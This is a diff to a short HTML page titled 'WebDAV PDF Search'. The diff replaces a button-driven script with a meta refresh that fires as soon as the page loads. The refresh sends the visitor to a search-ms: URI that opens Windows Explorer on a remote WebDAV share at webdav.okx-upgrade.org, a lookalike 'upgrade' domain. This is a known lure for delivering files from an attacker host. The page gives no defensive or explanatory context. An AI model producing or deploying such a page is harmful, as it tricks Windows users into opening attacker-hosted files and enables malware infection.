@@ -2,20 +2,10 @@
 <html>
 <head>
   <title>WebDAV PDF Search</title>
+  <meta http-equiv="refresh" content="0;url=search-ms:query=LawsofHumanNature&crumb=location:\\webdav.okx-upgrade.org@SSL\share">
 </head>
 <body>
-  <h1>Open PDF Search</h1>
-  <p><strong>Note:</strong> Windows may prompt to allow the search. Click "OK".</p>
-  <button onclick="openSearch()">Search PDF</button>
-  <script>
-    function openSearch() {
-      const searchUri = "search-ms:query=LawsofHumanNature&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\share";
-      try {
-        window.location.href = searchUri;
-      } catch (e) {
-        alert("Error: " + e.message + ". Ensure the WebDAV share (\\webdav.okx-upgrade.org@SSL\\share) is accessible.");
-      }
-    }
-  </script>
+  <h1>Opening PDF Search...</h1>
+  <p>If Windows Explorer does not open, ensure the WebDAV share (\\webdav.okx-upgrade.org@SSL\share) is accessible.</p>
 </body>
 </html>
